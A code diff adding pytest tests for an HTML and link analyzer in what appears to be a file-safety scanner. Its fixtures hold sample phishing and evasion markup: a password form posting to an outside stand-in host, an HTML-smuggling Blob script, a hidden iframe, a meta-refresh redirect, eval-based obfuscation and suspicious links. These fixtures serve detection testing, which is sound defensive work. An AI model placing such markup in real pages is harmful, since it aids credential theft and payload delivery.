@@ -8,6 +8,8 @@ from filetrust.pipeline import analyze
 import zlib
 from filetrust.analyzers.pdf import check_pdf
 from filetrust.report import defang
+from filetrust.analyzers.html_page import check_html
+from filetrust.analyzers.links import bad_link_reason
 
 def ids(findings):
     return [f.id for f in findings]
@@ -174,3 +176,67 @@ def test_plain_text_is_not_flagged(tmp_path):
     p.write_bytes(b"hello")
     info = inspect_file(p, "notes.txt")
     assert check(info) == []
+def make_html(path, body: str):
+    path.write_text(body, encoding="utf-8")
+
+
+def test_html_clean(tmp_path):
+    p = tmp_path / "a.html"
+    make_html(p, "<html><body><h1>Hello</h1>"
+                 "<a href='/about'>about</a></body></html>")
+    info = inspect_file(p, "a.html")
+    assert info.kind == "html"
+    assert check_html(info) == []
+
+
+def test_html_phishing_form_is_red(tmp_path):
+    p = tmp_path / "b.html"
+    make_html(p, '<html><body><form action="https://login-check.example/post" '
+                 'method="post"><input type="text" name="u">'
+                 '<input type="password" name="p"></form></body></html>')
+    findings = check_html(inspect_file(p, "b.html"))
+    assert "HTML_PASSWORD_FORM" in ids(findings)
+    assert "HTML_FORM_EXTERNAL" in ids(findings)
+    assert "ВИСОКИЙ" in score(findings)[1]
+
+
+def test_html_smuggling_is_red(tmp_path):
+    p = tmp_path / "c.html"
+    make_html(p, "<html><script>var d=atob('QUJD');var b=new Blob([d]);"
+                 "var u=URL.createObjectURL(b);</script></html>")
+    findings = check_html(inspect_file(p, "c.html"))
+    assert "HTML_SMUGGLING" in ids(findings)
+    assert "ВИСОКИЙ" in score(findings)[1]
+
+
+def test_html_hidden_iframe(tmp_path):
+    p = tmp_path / "d.html"
+    make_html(p, '<html><iframe src="x" width="0" height="0"></iframe></html>')
+    assert "HTML_HIDDEN_IFRAME" in ids(check_html(inspect_file(p, "d.html")))
+
+
+def test_html_redirect(tmp_path):
+    p = tmp_path / "e.html"
+    make_html(p, '<html><head><meta http-equiv="refresh" '
+                 'content="0;url=https://example.org/x"></head></html>')
+    assert "HTML_REDIRECT" in ids(check_html(inspect_file(p, "e.html")))
+
+
+def test_html_ip_link(tmp_path):
+    p = tmp_path / "f.html"
+    make_html(p, '<html><a href="http://10.0.0.5/x">click</a></html>')
+    assert "HTML_SUSPICIOUS_LINK" in ids(check_html(inspect_file(p, "f.html")))
+
+
+def test_html_obfuscation(tmp_path):
+    p = tmp_path / "g.html"
+    make_html(p, "<html><script>eval(unescape('%61'))</script></html>")
+    assert "HTML_OBFUSCATED_JS" in ids(check_html(inspect_file(p, "g.html")))
+
+
+def test_bad_link_reason():
+    assert bad_link_reason("http://10.0.0.5/x")
+    assert bad_link_reason("https://bit.ly/abc")
+    assert bad_link_reason("https://xn--80ak6aa92e.com")
+    assert bad_link_reason("https://example.com") is None
+    assert bad_link_reason("/relative/path") is None
